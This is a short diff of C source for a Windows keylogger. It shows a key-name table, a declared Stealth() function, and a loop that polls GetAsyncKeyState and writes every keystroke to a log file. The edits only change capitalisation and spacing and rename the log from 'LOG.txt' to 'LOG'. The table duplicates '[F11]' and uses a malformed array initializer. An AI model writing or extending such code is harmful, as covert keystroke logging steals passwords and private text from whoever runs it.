@@ -6,9 +6,9 @@ int Save (int key_stroke, char *file);
 int Stealth();
 
 char KEY_TABLE[61][10] = [
-        "[Back]", "[TAB]", "[N \n]", "[SHIFT]", "[CTRL]", "[ALT]", "[BRK]", "[C LOCK]", 
+        "[BACK]", "[TAB]", "[N \n]", "[SHIFT]", "[CTRL]", "[ALT]", "[BRK]", "[C LOCK]",
         "[ESC]", "[PG UP]", "[PG DN]", "[HOME]", "[LEFT]", "[UP]", "[RIGHT]", "[DOWN]",
-        "[prtscr]", "[INSERT]","[DEL]","[Super]","[SuperR]", "[N 0]", "[N 1]", "[N 2]",
+        "[prtscr]", "[INSERT]", "[DEL]", "[Super]", "[SuperR]", "[N 0]", "[N 1]", "[N 2]",
         "[N 3]", "[N 4]", "[N 5]", "[N 6]", "[N 7]", "[N 8]", "[N 9]", "[N *]",
         "[N +]", "[N -]", "[N .]", "[N /]", "[F1]", "[F2]", "[F3]", "[F4]",
         "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F11]",
@@ -22,7 +22,7 @@ int main(){
     while (1){
         for(i = 8; i <= 190; i++){
             if (GetAsyncKeyState(i) == -32767)
-            Save (i,"LOG.txt"); 
+            Save (i,"LOG"); 
         }
     }
     system ("PAUSE");
